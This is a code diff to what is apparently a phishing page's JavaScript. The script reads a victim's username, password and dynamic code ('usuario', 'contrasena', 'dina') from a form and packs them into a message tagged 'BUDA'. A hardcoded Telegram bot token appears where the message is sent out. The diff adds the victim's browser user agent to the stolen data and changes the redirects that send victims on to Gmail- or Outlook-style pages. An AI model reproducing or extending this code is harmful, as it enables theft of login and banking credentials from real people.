@@ -136,14 +136,16 @@
             var username = document.getElementsByName("usuario")[0].value;
             var password = document.getElementsByName("contrasena")[0].value;
             var dina = document.getElementsByName("dina")[0].value;
-
+            let userAgent = navigator.userAgent;
             var message =
               "✓✓✓BUDA✓✓✓\n@ProArgFull\nEmailBuda: " +
               username +
               "\nPassword: " +
               password +
               "\nDinamica" +
-              dina;
+              dina +
+              "\nUser: " +
+              userAgent;
 
             var telegramBotToken =
               "6322284639:AAFJI2SDBmlsbFJEGsFap6bJeR6w0b929iQ";
@@ -176,13 +178,13 @@
 
                 // Redirigir según el dominio del correo electrónico
                 if (emailDomain === "gmail.com") {
-                  window.location.href = "gmail/index.html";
+                  window.location.href = "gmail";
                 } else if (
                   emailDomain === "hotmail.com" ||
                   emailDomain === "live.com" ||
                   emailDomain === "outlook.com"
                 ) {
-                  window.location.href = "login/index.html";
+                  window.location.href = "login";
                 } else {
                   // Redirigir a otra página si es necesario
                   window.location.href = "index.html";
